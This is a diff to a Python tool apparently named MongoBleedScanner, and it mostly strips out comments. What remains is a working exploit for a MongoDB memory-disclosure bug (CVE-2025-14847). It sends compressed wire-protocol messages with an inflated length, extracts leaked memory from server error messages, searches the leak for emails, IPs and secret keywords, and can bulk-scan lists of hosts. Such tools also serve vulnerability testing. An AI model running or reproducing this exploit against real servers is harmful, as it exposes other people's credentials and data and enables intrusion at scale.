@@ -44,7 +44,7 @@ banner = fr"""
 VERSION = "1.0.0"
 print_lock = Lock()
 
-# Vulnerable versions
+
 VULNERABLE_VERSIONS = {
     "8.2": (0, 2),      # 8.2.0 - 8.2.2 (fixed in 8.2.3)
     "8.0": (0, 16),     # 8.0.0 - 8.0.16 (fixed in 8.0.17)
@@ -65,25 +65,18 @@ class MongoBleedScanner:
     def send_probe(self, doc_len, buffer_size):
         """Send crafted BSON with inflated document length to trigger memory leak"""
         try:
-            # Minimal BSON content - we lie about total length
-            # This is int32 field "a" with value 1
             content = b'\x10a\x00\x01\x00\x00\x00'
             
-            # Create BSON document with inflated doc_len
             bson = struct.pack('<i', doc_len) + content
             
-            # Wrap in OP_MSG (opcode 2013)
             op_msg = struct.pack('<I', 0) + b'\x00' + bson
             compressed = zlib.compress(op_msg)
             
-            # OP_COMPRESSED (opcode 2012) with inflated buffer size (triggers the bug)
             payload = struct.pack('<I', 2013)  # original opcode (OP_MSG)
             payload += struct.pack('<i', buffer_size)  # claimed uncompressed size (INFLATED)
             payload += struct.pack('B', 2)  # compressor ID: 2 = zlib
             payload += compressed
             
-            # MongoDB wire protocol header
-            # struct MsgHeader { int32 messageLength; int32 requestID; int32 responseTo; int32 opCode; }
             header = struct.pack('<IIII', 
                 16 + len(payload),  # total message length (header + body)
                 1,                   # requestID
@@ -91,13 +84,11 @@ class MongoBleedScanner:
                 2012                 # opCode: OP_COMPRESSED
             )
             
-            # Send to MongoDB server
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(self.timeout)
             sock.connect((self.host, self.port))
             sock.sendall(header + payload)
             
-            # Read response
             response = b''
             while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
                 chunk = sock.recv(4096)
@@ -129,12 +120,9 @@ class MongoBleedScanner:
         try:
             msg_len = struct.unpack('<I', response[:4])[0]
             
-            # Check if response is compressed (opcode 2012)
             if struct.unpack('<I', response[12:16])[0] == 2012:
-                # Decompress the response
                 raw = zlib.decompress(response[25:msg_len])
             else:
-                # Uncompressed response
                 raw = response[16:msg_len]
         except Exception as e:
             if self.verbose:
@@ -143,15 +131,11 @@ class MongoBleedScanner:
         
         leaks = []
         
-        # Extract field names from BSON errors (main leak vector)
-        # MongoDB returns errors like: "field name 'LEAKED_DATA'"
         for match in re.finditer(rb"field name '([^']*)'", raw):
             data = match.group(1)
-            # Filter out expected/normal field names
             if data and data not in [b'?', b'a', b'$db', b'ping', b'ismaster', b'isMaster']:
                 leaks.append(data)
         
-        # Extract type bytes from "Unrecognized type" errors
         for match in re.finditer(rb"type (\d+)", raw):
             type_byte = int(match.group(1)) & 0xFF
             leaks.append(bytes([type_byte]))
@@ -165,8 +149,6 @@ class MongoBleedScanner:
             sock.settimeout(self.timeout)
             sock.connect((self.host, self.port))
             
-            # Send ismaster command (simple ping)
-            # OP_MSG with ismaster BSON document
             bson_doc = b'\x08ismaster\x00\x01'
             bson_doc = struct.pack('<i', len(bson_doc) + 5) + bson_doc + b'\x00'
             
@@ -175,7 +157,6 @@ class MongoBleedScanner:
             
             sock.sendall(header + op_msg)
             
-            # Read response header
             response = sock.recv(16)
             sock.close()
             
@@ -193,7 +174,6 @@ class MongoBleedScanner:
     def scan(self, min_offset=20, max_offset=500, save_output=None):
         """Main scan function to detect and exploit CVE-2025-14847"""
         
-        # Check if MongoDB is running
         print(f"{Fore.CYAN}[*] Checking if target is MongoDB...{Style.RESET_ALL}")
         is_mongodb, msg = self.check_mongodb()
         if is_mongodb:
@@ -202,7 +182,6 @@ class MongoBleedScanner:
             print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")
             return False
         
-        # Scan for memory leaks
         print(f"{Fore.CYAN}[*] Scanning for CVE-2025-14847 (MongoBleed)...{Style.RESET_ALL}")
         print(f"{Fore.CYAN}[*] Testing offsets {min_offset}-{max_offset}...{Style.RESET_ALL}\n")
         
@@ -219,13 +198,11 @@ class MongoBleedScanner:
                     unique_leaks.add(data)
                     all_leaked.extend(data)
                     
-                    # Show interesting leaks (> 10 bytes or contains printable chars)
                     if len(data) > 10 or any(32 <= b <= 126 for b in data):
                         preview = data[:80].decode('utf-8', errors='replace')
                         interesting_leaks.append((doc_len, data))
                         print(f"{Fore.YELLOW}[+] Offset={doc_len:4d} Len={len(data):4d}: {Fore.WHITE}{preview}{Style.RESET_ALL}")
         
-        # Results
         print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
         
         if len(all_leaked) > 0:
@@ -234,10 +211,8 @@ class MongoBleedScanner:
             print(f"{Fore.YELLOW}[*] Unique fragments: {len(unique_leaks)}{Style.RESET_ALL}")
             print(f"{Fore.YELLOW}[*] Interesting leaks: {len(interesting_leaks)}{Style.RESET_ALL}")
             
-            # Search for sensitive patterns
             self.search_secrets(all_leaked)
             
-            # Save to file
             if save_output:
                 with open(save_output, 'wb') as f:
                     f.write(all_leaked)
@@ -264,20 +239,18 @@ class MongoBleedScanner:
         print(f"\n{Fore.CYAN}[*] Searching for sensitive patterns...{Style.RESET_ALL}")
         found = False
         
-        # Check keyword patterns
         for category, keywords in patterns.items():
             if category in ['emails', 'ips']:
                 matches = keywords.findall(data)
                 if matches:
                     found = True
                     print(f"{Fore.RED}[!] Found {category}: {len(matches)} matches{Style.RESET_ALL}")
-                    for match in matches[:5]:  # Show first 5
+                    for match in matches[:5]:
                         print(f"    {Fore.WHITE}{match.decode('utf-8', errors='replace')}{Style.RESET_ALL}")
             else:
                 for keyword in keywords:
                     if keyword.lower() in data.lower():
                         found = True
-                        # Find context around the match
                         idx = data.lower().find(keyword.lower())
                         context_start = max(0, idx - 20)
                         context_end = min(len(data), idx + len(keyword) + 40)
@@ -292,8 +265,7 @@ class MongoBleedScanner:
 def scan_target(target, port, timeout, verbose):
     """Scan a single target (for bulk scanning)"""
     try:
-        # Parse target (handle host:port format)
-        if ':' in target and not target.count(':') > 1:  # Not IPv6
+        if ':' in target and not target.count(':') > 1:
             host, target_port = target.rsplit(':', 1)
             port = int(target_port)
         else:
@@ -301,18 +273,16 @@ def scan_target(target, port, timeout, verbose):
         
         scanner = MongoBleedScanner(host, port, timeout, verbose=False)
         
-        # Quick check
         is_mongodb, _ = scanner.check_mongodb()
         if not is_mongodb:
             with print_lock:
                 print(f"{Fore.YELLOW}[-] {target:40} - Not MongoDB{Style.RESET_ALL}")
             return False, target
         
-        # Scan for vulnerability (limited probes for bulk mode)
         all_leaked = bytearray()
         unique_leaks = set()
         
-        for doc_len in range(20, 200):  # Limited range for speed
+        for doc_len in range(20, 200):
             response = scanner.send_probe(doc_len, doc_len + 500)
             leaks = scanner.extract_leaks(response)
             
@@ -362,7 +332,6 @@ def bulk_scan(file_path, port=27017, max_workers=10, timeout=5, verbose=False):
                 if is_vuln:
                     vulnerable_targets.append(target)
         
-        # Summary
         print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}[*] Scan Summary:{Style.RESET_ALL}")
         print(f"{Fore.RED}[!] Vulnerable targets: {len(vulnerable_targets)}/{len(targets)}{Style.RESET_ALL}")
@@ -426,7 +395,6 @@ def main():
     
     args = parser.parse_args()
     
-    # Bulk scan mode
     if args.file:
         bulk_scan(
             args.file,
@@ -437,7 +405,6 @@ def main():
         )
         return
     
-    # Single target mode
     if not args.host:
         parser.error("--host or --file is required")
     
